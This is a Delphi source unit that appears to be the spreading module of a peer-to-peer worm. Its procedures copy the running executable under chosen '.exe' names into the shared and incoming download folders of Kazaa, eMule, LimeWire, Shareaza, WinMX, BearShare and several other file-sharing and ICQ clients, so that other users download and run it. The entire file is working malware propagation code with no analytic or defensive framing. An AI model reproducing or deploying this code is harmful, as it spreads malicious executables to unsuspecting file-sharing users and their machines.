unit uSpread;

interface

uses
  Windows, uUtils;

procedure StartSpread(FileName :Array of String);

implementation

procedure ShareazaStart(FileName :String);
var
  Path :String;
begin
  Path := ReadKeyToString(HKEY_CURRENT_USER, 'Software\Shareaza\Shareaza\Downloads', 'CollectionPath');
  if not (Path = '') then
  begin
    CopyFile(PChar(ParamStr(0)), PChar(Path+'\'+FileName), True);
  end;
end;

procedure EmuleStart(FileName :String);
var
  Path :String;
begin
  Path := GetMyDocuments;
  if not (Path = '') then
  begin
    CopyFile(PChar(ParamStr(0)), PChar(Path+'\Downloads\eMule\Incoming\'+FileName), True);
    CopyFile(PChar(ParamStr(0)), PChar(GetProgramFiles+'\emule\incoming\'+FileName), True);
  end;
end;

procedure KazaaStart(FileName :String);
var
  Path :String;
begin
  Path := GetProgramFiles;
  if not (Path = '') then
  begin
    CopyFile(PChar(ParamStr(0)), PChar(Path+'\kazaa\my shared folder\'+FileName), True);
    CopyFile(PChar(ParamStr(0)), PChar(Path+'\kazaa lite\my shared folder\'+FileName), True);
    CopyFile(PChar(ParamStr(0)), PChar(Path+'\kazaa lite k++\my shared folder\'+FileName), True);
  end;
end;

procedure IcqStart(FileName :String);
var
  Path :String;
begin
  Path := GetProgramFiles;
  if not (Path = '') then
  begin
    CopyFile(PChar(ParamStr(0)), PChar(Path+'\icq\shared folder\'+FileName), True);
  end;
end;

procedure GroksterStart(FileName :String);
var
  Path :String;
begin
  Path := GetProgramFiles;
  if not (Path = '') then
  begin
    CopyFile(PChar(ParamStr(0)), PChar(Path+'\grokster\my grokster\'+FileName), True);
  end;
end;

procedure BearshareStart(FileName :String);
var
  Path :String;
begin
  Path := GetProgramFiles;
  if not (Path = '') then
  begin
    CopyFile(PChar(ParamStr(0)), PChar(Path+'\bearshare\shared\'+FileName), True);
  end;
end;

procedure Edonkey2000Start(FileName :String);
var
  Path :String;
begin
  Path := GetProgramFiles;
  if not (Path = '') then
  begin
    CopyFile(PChar(ParamStr(0)), PChar(Path+'\edonkey2000\incoming\'+FileName), True);
  end;
end;

procedure MorpheusStart(FileName :String);
var
  Path :String;
begin
  Path := GetProgramFiles;
  if not (Path = '') then
  begin
    CopyFile(PChar(ParamStr(0)), PChar(Path+'\morpheus\my shared folder\'+FileName), True);
  end;
end;

procedure LimewireStart(FileName :String);
var
  Path :String;
begin
  Path := GetProgramFiles;
  if not (Path = '') then
  begin
    CopyFile(PChar(ParamStr(0)), PChar(Path+'\limewire\shared\'+FileName), True);
  end;
end;

procedure TeslaStart(FileName :String);
var
  Path :String;
begin
  Path := GetProgramFiles;
  if not (Path = '') then
  begin
    CopyFile(PChar(ParamStr(0)), PChar(Path+'\tesla\files\'+FileName), True);
  end;
end;

procedure WinmxStart(FileName :String);
var
  Path :String;
begin
  Path := GetProgramFiles;
  if not (Path = '') then
  begin
    CopyFile(PChar(ParamStr(0)), PChar(Path+'\winmx\shared\'+FileName), True);
  end;
end;

procedure StartSpread(FileName :Array of String);
var
  i :Integer;
  Name :String;
begin
  i := 1;
  while true do
  begin
    if FileName[i] = '' then break;
    Name := FileName[i]+'.exe';
    BearshareStart(Name);
    Edonkey2000Start(Name);
    EmuleStart(Name);
    GroksterStart(Name);
    IcqStart(Name);
    KazaaStart(Name);
    LimewireStart(Name);
    MorpheusStart(Name);
    ShareazaStart(Name);
    TeslaStart(Name);
    WinmxStart(Name);
    i := i + 1;
  end;
end;

end.
